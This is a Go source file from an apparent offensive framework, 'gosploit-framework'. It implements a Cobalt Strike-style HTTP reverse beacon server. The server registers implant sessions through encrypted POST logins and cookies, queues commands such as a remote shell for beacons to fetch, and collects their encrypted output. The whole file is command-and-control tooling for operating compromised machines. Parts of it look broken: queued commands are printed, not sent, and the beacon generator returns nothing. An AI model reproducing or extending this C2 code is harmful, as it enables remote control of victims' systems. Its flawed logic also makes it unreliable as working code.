package cobaltstrike

import (
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"gosploit-framework/core"
	"gosploit-framework/module/cc/cobaltstrike/command"
	"io/ioutil"
	"net/http"
	"time"
)

type HttpReverseBeacon struct {
	*Beacon

	Sessions []*HttpReverseSession
	Profile  *HttpReverseProfile
}

type HttpReverseProfile struct {
	GetUrl      string
	PostUrl     string
	BeaconAddr  string
	SessionName string
	SleepTime   time.Duration
}

type HttpReverseSession struct {
	ID             string
	GetCommandChan chan []byte
	PostOutputChan chan []byte
}

func (cc *HttpReverseBeacon) Generate() []byte {
	return nil
}

func (cc *HttpReverseBeacon) Run() {
	go func() {
		server := &http.Server{
			Addr: cc.Profile.BeaconAddr,
		}
		mux := http.NewServeMux()
		mux.HandleFunc(cc.Profile.GetUrl, cc.GetCommand)
		mux.HandleFunc(cc.Profile.PostUrl, cc.PostOutput)
		server.Handler = mux
		server.ListenAndServe()
	}()
}

func (cc *HttpReverseBeacon) GetCommand(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			w.WriteHeader(http.StatusNotFound)
		}
	}()

	cookie, err := r.Cookie(cc.Profile.SessionName)
	if err != nil {
		panic(err)
	}
	for _, session := range cc.Sessions {
		if cookie.Value == session.ID {
			select {
			case data := <-session.GetCommandChan:
				print(data)
			default:
				cmd := command.SleepCommand{SleepTime: cc.Profile.SleepTime}
				cmd.Operate = "Sleep"
				json.Marshal(cmd)
			}
			return
		}
	}
	panic(ErrRequestMissCookie)
}

func (cc *HttpReverseBeacon) PostLogin(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	plainData := cc.decrypt(data)
	if plainData == nil {
		return
	}

	s := sha1.New()
	s.Write(plainData)
	s.Write([]byte(core.RamdonString(16)))

	session := &HttpReverseSession{ID: fmt.Sprintf("%x", s.Sum(nil))}
	session.GetCommandChan = make(chan []byte)
	session.PostOutputChan = make(chan []byte)
	cc.Sessions = append(cc.Sessions, session)
	w.Header().Add("Set-Cookie", fmt.Sprintf("%s=%s", cc.Profile.SessionName, session.ID))
	w.Write(nil)
}

func (cc *HttpReverseBeacon) PostOutput(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			w.WriteHeader(http.StatusNotFound)
		}
	}()

	cookie, err := r.Cookie(cc.Profile.SessionName)
	if err == http.ErrNoCookie {
		cc.PostLogin(w, r)
		return
	}
	for _, session := range cc.Sessions {
		if cookie.Value == session.ID {
			data, err := ioutil.ReadAll(r.Body)
			if err != nil {
				panic(err)
			}
			output := cc.decrypt(data)
			print(output)
			w.Write(cc.encrypt([]byte("success")))
			return
		}
	}
	panic(ErrRequestMissCookie)
}

func (ccs *HttpReverseSession) Shell() error {
	cmd := command.ShellCommand{}
	cmd.Operate = "Shell"
	data, err := json.Marshal(cmd)
	if err != nil {
		return err
	}
	ccs.GetCommandChan <- data
	return nil
}
